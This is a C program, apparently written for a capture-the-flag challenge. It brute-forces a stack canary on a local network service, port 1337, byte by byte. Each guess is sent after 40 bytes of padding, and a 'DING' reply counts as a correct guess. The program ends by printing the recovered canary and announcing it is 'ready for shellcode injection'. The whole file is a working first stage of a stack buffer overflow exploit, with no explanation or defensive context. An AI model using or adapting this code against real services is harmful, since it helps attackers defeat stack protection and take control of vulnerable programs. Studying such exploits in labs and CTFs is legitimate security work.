    #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>

int try_byte(unsigned char *found_canary, int len, unsigned char guess) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1337);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    // Short timeout for connection to keep things moving
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 100000; // 100ms
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return 0;
    }

    char buffer[1024] = {0};
    // 1. Read the "Length: " prompt
    read(sock, buffer, 8); 

    // 2. Send the total length (40 padding + bytes found so far + 1 guess)
    int total_len = 40 + len + 1;
    write(sock, &total_len, 4);

    // 3. Read the "Going to read..." response to stay in sync
    read(sock, buffer, 1024); 

    // 4. Construct payload
    unsigned char payload[128];
    memset(payload, 'A', 40);
    memcpy(payload + 40, found_canary, len);
    payload[40 + len] = guess;

    // 5. Send payload
    write(sock, payload, total_len);

    // 6. Check for "DING"
    memset(buffer, 0, 1024);
    int n = read(sock, buffer, 1024);
    close(sock);

    if (n > 0 && strstr(buffer, "DING")) {
        return 1;
    }
    return 0;
}

int main() {
    unsigned char canary[8] = {0}; 
    canary[0] = 0x00; // The first byte of a canary is always 0x00
    
    printf("[*] Starting Canary Brute-force at Offset 40\n");
    printf("[*] Known byte 0: 0x00\n");

    for (int i = 1; i < 8; i++) {
        printf("[*] Finding byte %d... ", i);
        fflush(stdout);

        int found = 0;
        for (int g = 0; g < 256; g++) {
            // Progress print: \r moves the cursor back to the start of the line
            printf("\r[*] Finding byte %d... Trying: 0x%02x ", i, g);
            fflush(stdout);

            if (try_byte(canary, i, (unsigned char)g)) {
                canary[i] = (unsigned char)g;
                printf("\n[+] SUCCESS! Byte %d is 0x%02x\n", i, g);
                found = 1;
                break;
            }
        }

        if (!found) {
            printf("\n[!] ERROR: Could not find byte %d. Is the server still running?\n", i);
            return -1;
        }
    }

    printf("\n[#] BRUTE FORCE COMPLETE\n");
    printf("[#] Final Canary: ");
    for(int i = 0; i < 8; i++) printf("%02x", canary[i]);
    printf("\n\nReady for shellcode injection. Copy this canary value!\n");

    return 0;
}
